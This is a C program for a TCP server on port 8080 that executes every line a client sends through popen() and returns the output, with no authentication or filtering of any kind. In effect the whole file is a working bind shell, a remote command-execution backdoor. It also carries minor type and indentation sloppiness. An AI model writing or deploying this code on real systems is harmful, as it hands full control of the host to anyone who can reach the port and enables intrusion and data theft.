#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 8080
#define MAX_CLIENTS 5

// TODO increase buffer size and extract to a constant

void error(const char *msg)
{
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[])
{
    int sockfd, newsockfd, clilen;
    char buffer[256];
    struct sockaddr_in serv_addr, cli_addr;
    int n;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
       error("ERROR opening socket");

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) 
        error("ERROR on binding");

    listen(sockfd, MAX_CLIENTS);
    clilen = sizeof(cli_addr);

int running = 1; // Add a running flag

while (running) { // Change this to check the running flag
    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    if (newsockfd < 0) 
        error("ERROR on accept");

    while (1) {
        bzero(buffer, 256);
        n = read(newsockfd, buffer, 255);
        if (n < 0) error("ERROR reading from socket");
        buffer[n] = 0; // Null-terminate the string

        if (strcmp(buffer, "exit\n") == 0 || strcmp(buffer, "exit") == 0) { // Check for "exit" command
            running = 0; // Set running flag to 0
            break;
        }

        printf("Executing command: %s\n", buffer);
        FILE *fp = popen(buffer, "r"); // Execute the command and create a pipe to read its output
        if (!fp) {
            error("Failed to run command");
        }

        // Read the output of the command and send it over the socket
        while (fgets(buffer, sizeof(buffer)-1, fp) != NULL) {
            n = write(newsockfd, buffer, strlen(buffer));
            if (n < 0) error("ERROR writing to socket");
        }
        pclose(fp);
    }

    close(newsockfd);
}

close(sockfd);
return 0;
}